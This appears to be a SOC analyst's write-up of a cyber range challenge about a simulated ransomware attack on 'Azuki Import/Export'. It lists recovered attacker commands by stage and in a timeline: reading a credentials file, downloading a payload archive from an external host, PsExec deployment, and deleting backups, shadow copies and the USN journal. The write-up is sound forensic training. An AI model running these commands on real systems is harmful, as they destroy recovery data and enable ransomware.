# SOC Incident Investigation – Azuki Import/Export Compromise Part 4

<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/5fd938d8-1e9a-435e-b734-af52e742aa2b" />

**Analyst:** Luka Groff

**Source:** Cyber Range SOC Challenge

**System:** azuki-adminpc

---

## Overview
It's been a week since the initial compromise. You arrive Monday morning to find ransom notes across every system. The threat actors weren't just stealing data - they were preparing for total devastation.

---

## Key Findings

### Lateral Movement
- Source IP: `10.1.0.108`
- Compromised User: `yuki.tanaka`
- Device: `azuki-adminpc`

### Credential Access
- `cat /backups/configs/all-credentials.txt`
- `backup-admin`

### Command and Control
- `curl -L -o destroy.7z hxxps[://]litter[.]catbox[.]moe/io523y[.]7z`

### Execution
- `silentlynx.exe`

### Discovery
- `find /backups -name *.tar.gz`
- `cat /etc/passwd`
- `cat /etc/crontab`
- `ls --color=auto -la /backups/`

### Persistence
- `Microsoft\Windows\Security\SecurityHealthService`
- `WindowsSecurityHealth`

### Defense Evasion
- `"taskkill" /F /IM sqlservr.exe`
- `"fsutil.exe" usn deletejournal /D C:`


### Impact
- `rm -rf /backups/archives
- `systemctl stop cron`
- `systemctl disable cron`
- `"net" stop VSS /y`
- `"net" stop wbengine /y`
- `"vssadmin" delete shadows /all /quiet`
- `"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB`
- `"bcdedit" /set {default} recoveryenabled No`
- `"wbadmin" delete catalog -quiet`
- `SILENTLYNX_README.txt`

---

## Full Timeline 24th & 25th of November 2025

| Time (UTC) | Flag |	Stage	| Event / Artifact |
|------------|-------|-------|-----------------|
| 2025-11-24 14:14:14 |	**Flag 9** |	Credential Access |	Command to access stored credentials → cat /backups/configs/all-credentials.txt |
| 2025-11-24 14:16:06 |	**Flag 5,6,7** |	Discovery |	Backup archive search command → "find /backups -name *.tar.gz"; enumeration commands → "cat /etc/passwd", "cat /etc/crontab" |
| 2025-11-25 05:39:10 |	**Flag 1** |	Lateral Movement |	emote access command → "ssh.exe" backup-admin@10.1.0.189 |
| 05:39:22 |	**Flag 2,3** |	Lateral Movement & Credential Access |	Source IP → "10.1.0.108" ; account used → backup-admin |
| 05:45:34 |	**Flag 8** |	C2 |	External tools download command → curl -L -o destroy.7z hxxps[://]litter[.]catbox[.]moe/io523y[.]7z |
| 05:47:02 |	**Flag 10** |	Impact |	Command used to destroy backups → rm -rf /backups/archives |
| 05:47:03 |	**Flag 11,12** |	Impact |	Commands used to stop and disable backup service → systemctl stop cron & systemctl disable cron |
| 05:47:51 |	**Flag 4** |	Discovery |	File System Enumeration → ls --color=auto -la /backups/ |
| 06:03:47 |	**Flag 13** |	Lateral Movement |	Tool used to execute remote commands → PsExec64.exe |
| 06:04:40 |	**Flag 14,15** |	Lateral Movement & Execution |	Full deployment command → "PsExec64.exe" \\10.1.0.188 -u fileadmin -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe ; Payload deployed → silentlynx.exe|
| 06:04:53 |	**Flag 16** |	Impact |	Command used to stop shadow copy service → "net" stop VSS /y |
| 06:04:54 |	**Flag 17** |	Impact |	Command used to stop backup engine → "net" stop wbengine /y |
| 06:04:57 |	**Flag 18** |	Defense Evasion |	Command used to terminate process to unlock files → "taskkill" /F /IM sqlservr.exe |
| 06:04:59 |	**Flag 19** |	Impact |	Command used to delete recovery points → "vssadmin" delete shadows /all /quiet |
| 06:04:59 |	**Flag 20** |	Impact |	Command used to limit recovery storage → "vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB |
| 06:04:59 |	**Flag 21** |	Impact |	Command used to disable system recovery → "bcdedit" /set {default} recoveryenabled No |
| 06:05:00|	**Flag 22** |	Impact |	Command used to delete the backup catalogue → "wbadmin" delete catalog -quiet |
| 06:05:01 |	**Flag 23,24** |	Persistence |	Scheduled task name & registry value → Microsoft\Windows\Security\SecurityHealthService & WindowsSecurityHealth |
| 06:05:01 |	**Flag 26** |	Impact |	ransom note filename  → SILENTLYNX_README.txt |
| 06:10:04 |	**Flag 25** |	Defense Evasion |	Command used to delete forensic evidence → "fsutil.exe" usn deletejournal /D C: |

---
